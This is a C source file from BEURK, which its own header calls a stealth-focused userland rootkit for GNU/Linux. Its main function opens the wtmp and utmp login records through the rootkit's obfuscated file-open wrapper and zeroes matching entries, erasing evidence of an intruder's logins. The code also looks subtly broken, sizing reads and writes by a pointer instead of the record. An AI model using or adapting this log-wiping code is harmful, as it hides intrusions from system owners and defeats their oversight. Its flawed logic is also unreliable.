/*
 * beurk is an userland rootkit for gnu/linux, focused around stealth.
 * copyright (c) 2015  unix-thrust
 *
 * this file is part of beurk.
 *
 * beurk is free software: you can redistribute it and/or modify
 * it under the terms of the gnu general public license as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * BEURK is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <utmp.h>
#include "beurk.h"

void    cleanup(void *var, size_t len) {
    DEBUG(D_INFO, "Calling cleanup");
    memset(var, 0, len);
    free(var);
}

static void uwtmp_clean(struct utmp *uwtmp_entry, char *uwtmp, int fd) {
    lseek(fd, 0, SEEK_SET);
    while(read(fd, uwtmp_entry, sizeof(uwtmp_entry))) {
        if(!strncmp(uwtmp_entry->ut_line, uwtmp, strlen(uwtmp))) {
            memset(uwtmp_entry, 0, sizeof(*uwtmp_entry));
            lseek(fd, -(sizeof(*uwtmp_entry)), SEEK_CUR);
            write(fd, uwtmp_entry, sizeof(uwtmp_entry));
        }
    }
    close(fd);
}

void    clean_log_entries(char *wtmp, char *utmp) {
    struct utmp     uwtmp_entry;
    int             fd;

    DEBUG(D_INFO, "Cleaning log entries.");
    fd = REAL_OPEN(WTMP_FILE_XOR, O_RDWR);
    if (fd > 0)
        uwtmp_clean(&uwtmp_entry, wtmp, fd);
    fd = REAL_OPEN(UTMP_FILE_XOR, O_RDWR);
    if (fd > 0)
        uwtmp_clean(&uwtmp_entry, utmp, fd);
}
